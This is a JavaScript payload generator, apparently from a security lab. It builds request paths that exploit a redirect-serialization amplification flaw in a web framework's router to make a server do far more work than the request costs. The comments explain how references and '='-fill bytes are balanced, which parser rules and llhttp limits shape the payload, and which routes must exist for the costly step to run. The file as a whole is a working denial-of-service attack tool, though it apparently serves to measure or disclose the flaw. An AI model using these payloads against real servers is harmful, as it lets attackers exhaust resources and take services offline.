// Request-target generator for the lab.
//
// The amplifier is `output = references x serialized length of the referenced value`.
// Both factors come out of the same request, so the request is split in half: half of
// the bytes buy references, half buy the value they point at.
//
// Shape:  /restaurant/<location>/menu?z=<fill>&meal=x
//
//   location = "x%3F" + "<key>=:z" + "&<key>=:z" ... + "&"
//     The redirect function returns `/restaurant/${location}/menu/${meal}`, so the
//     decoded location decides how that string parses. `%3F` opens a query, and every
//     `<key>=:z` after it becomes one reference to the request's own `z` parameter.
//     Separators are raw `&`: SEGMENT_RE (/^[^\/()?;#]+/) accepts `&` inside a path
//     segment, so a reference costs 5 bytes instead of the 7 it costs inside a query
//     value, where `&` has to be written `%26`.
//
//   fill = "=" repeated
//     `=` is one byte in a query value (QUERY_PARAM_VALUE_RE is /^[^&#]+/) and
//     `encodeUriQuery` writes it back as `%3D`, so every fill byte is serialized as
//     three. That is the largest expansion available: `encodeUriString` un-escapes
//     `%40`, `%3A`, `%24`, `%2C` and `%3B`, so `@ : $ , ;` stay one byte, and llhttp
//     answers 400 to every byte outside 0x21-0x7e, which rules out the 6x expansion
//     of raw non-ASCII.
//
// Keys are distinct because `parseQueryParam` collapses a repeated key into an array,
// and `createQueryParams` only substitutes string values. They are drawn shortest
// first from the 73 characters that are RFC 3986 `pchar`, legal in a query-parameter
// name, and legal unencoded inside a path segment.
const KEY_CHARS =
  "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-._~!$'*,:@";

function* keyNames() {
  for (const a of KEY_CHARS) yield a;
  for (const a of KEY_CHARS) for (const b of KEY_CHARS) yield a + b;
  for (const a of KEY_CHARS) for (const b of KEY_CHARS) for (const c of KEY_CHARS) yield a + b + c;
}

// Two heads, because the redirect's PATH decides whether its destination is routable
// at all, and an unroutable destination is answered 404 without ever serializing the
// tree, which is where the cost is.
//
//   'x%3F'                  -> /restaurant/x?<query>            2 segments, needs a
//                              catch-all route to be reachable
//   'a%2Fmenu%2Flunch%3F'   -> /restaurant/a/menu/lunch?<query>  matches the guide's own
//                              destination route, so no catch-all is needed, but the
//                              redirect route needs pathMatch: 'full' or it re-matches
//                              by prefix and the chain drops the query
const HEADS = { catchAll: '/restaurant/x%3F', destination: '/restaurant/a%2Fmenu%2Flunch%3F' };

export function payload(targetBytes, control, land = 'destination') {
  const sigil = control ? '@' : ':';
  const head = HEADS[land] ?? HEADS.catchAll;
  const tail = '/menu?z=';
  const meal = '&meal=x';
  // Half the budget buys references; `refBytes` is measured on the wire.
  const refBytes = Math.round((targetBytes - head.length - tail.length - meal.length) / 2);
  const refs = [];
  let spent = 0;
  for (const key of keyNames()) {
    const ref = `${refs.length ? '&' : ''}${key}=${sigil}z`;
    if (spent + ref.length + 1 > refBytes) break; // +1 for the closing '&'
    refs.push(ref);
    spent += ref.length;
  }
  const prefix = head + refs.join('') + '&' + tail;
  const fillBytes = targetBytes - prefix.length - meal.length;
  if (fillBytes <= 0) throw new Error(`targetBytes ${targetBytes} is too small`);
  const path = prefix + '='.repeat(fillBytes) + meal;
  return { path, markers: refs.length, refs: refs.length, fillBytes };
}
